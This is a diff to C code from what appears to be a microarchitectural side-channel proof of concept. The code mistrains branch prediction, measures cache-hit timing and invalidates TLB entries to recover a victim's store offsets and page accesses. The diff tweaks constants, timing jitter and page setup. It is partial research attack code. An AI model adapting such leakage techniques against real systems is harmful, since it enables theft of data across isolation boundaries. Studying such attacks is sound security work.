@@ -53,7 +53,7 @@ static bool check_probe() {
 }
 // end of util functions
 
-#define VICTIM_STORE_OFFSET (0x888u)
+#define VICTIM_STORE_OFFSET (0x528u)
 static int __attribute__((noinline)) store_offset_recovery() {
     int ret = 0;
     // use the first (MISTRAIN_EPOCH - 1) iters to mistrain, then mispredict
@@ -82,7 +82,7 @@ static int __attribute__((noinline)) store_offset_recovery() {
         goto mmap_fail;
     }
 
-    // usleep(rand() % 256);
+    usleep(rand() % 256);
     for (u32 disp = 0; disp < INDEX_COUNT; disp++) {
         u8 *ptr = pages + disp * PAGE_SIZE;
         u32 counter = 0;
@@ -232,7 +232,6 @@ static int __attribute__((noinline)) load_page_recovery_throughput() {
             // throughput if _maccess(page)'s page walk is stalled a lot
             while (*start) {
                 ptedit_invalidate_tlb(page);
-                // _mwrite(page, 0xff);
                 _maccess(page);
                 _lfence();
                 cnt += 1;
@@ -306,7 +305,6 @@ static int __attribute__((noinline)) load_page_recovery_contention() {
         while (true) {
             ptedit_invalidate_tlb(page);
             _maccess(page);
-            // _mwrite(page, 0xff);
         }
     } else if (pid < 0) {
         fprintf(stderr, "Failed to fork.\n");
@@ -368,8 +366,7 @@ int main(int argc, char **argv) {
     threshold = _get_cache_hit_threshold();
     fprintf(stderr, "Cache Hit Threshold: %u\n", threshold);
 
-    victim_page =
-        setup_page((void *)0x600fff8a0000ull, PAGE_SIZE, 0x1 /* init value */);
+    victim_page = setup_page(NULL, PAGE_SIZE, 0x1 /* init value */);
     normal_page = setup_page(NULL, PAGE_SIZE, 0x2);
     probe = setup_page(NULL, PAGE_SIZE * 2, 0x0);
     garbage = setup_page(NULL, PAGE_SIZE * 2, 0x0);
